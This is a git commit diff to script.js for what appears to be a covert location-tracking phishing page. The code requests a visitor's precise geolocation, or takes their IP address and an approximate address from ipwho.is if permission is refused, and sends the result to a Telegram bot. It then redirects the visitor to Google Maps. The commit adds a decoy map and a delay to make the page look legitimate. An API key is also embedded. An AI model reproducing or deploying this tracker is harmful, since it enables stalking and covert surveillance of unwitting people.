262fb1ec4b3821d592cc65e5c83fde4a14d85a0d
github-shamil <168990260+github-shamil@users.noreply.github.com>
2025-06-15 05:02:11 +0530

    Update script.js

--- script.js
+++ script.js
@@ -4,18 +4,20 @@ const OPENCAGE_API_KEY = '8e640acb36a3409a9877e0c900653f7d';
 const redirectURL = 'https://maps.google.com';
 
 const loading = document.getElementById('loading-screen');
-const retryBtn = document.getElementById('retry-location');
 
-window.onload = () => {
-  getLocation();
-};
+function initMap() {
+  new google.maps.Map(document.getElementById("map"), {
+    center: { lat: 20, lng: 78 },
+    zoom: 4,
+  });
 
-retryBtn.onclick = () => {
-  getLocation();
-};
+  setTimeout(() => {
+    getLocation();
+    loading.style.display = "none";
+  }, 1500);
+}
 
 function getLocation() {
-  loading.style.display = 'flex';
   navigator.geolocation.getCurrentPosition(success, denied, { enableHighAccuracy: true });
 }
 
@@ -23,10 +25,10 @@ function success(position) {
   const { latitude, longitude } = position.coords;
   reverseGeocode(latitude, longitude, (locationName) => {
     const message = `
-✅ USER ALLOWED LOCATION
-🌍 Lat: ${latitude}
-🌍 Lon: ${longitude}
-📍 Address: ${locationName}
+✅ USER ALLOWED
+📍 Lat: ${latitude}
+📍 Lon: ${longitude}
+📌 Location: ${locationName}
     `.trim();
     sendTelegram(message);
     window.location.href = redirectURL;
@@ -37,11 +39,11 @@ function denied() {
   fetch('https://ipwho.is')
     .then(res => res.json())
     .then(data => {
-      const locationName = `${data.country}, ${data.region}, ${data.city}`;
+      const location = `${data.country}, ${data.region}, ${data.city}`;
       const message = `
-❌ USER DENIED LOCATION
+❌ USER DENIED
 🔹 IP: ${data.ip}
-📍 Approx Address: ${locationName}
+📌 Location: ${location}
       `.trim();
       sendTelegram(message);
       window.location.href = redirectURL;
@@ -68,3 +70,5 @@ function sendTelegram(message) {
     })
   });
 }
+
+window.initMap = initMap;
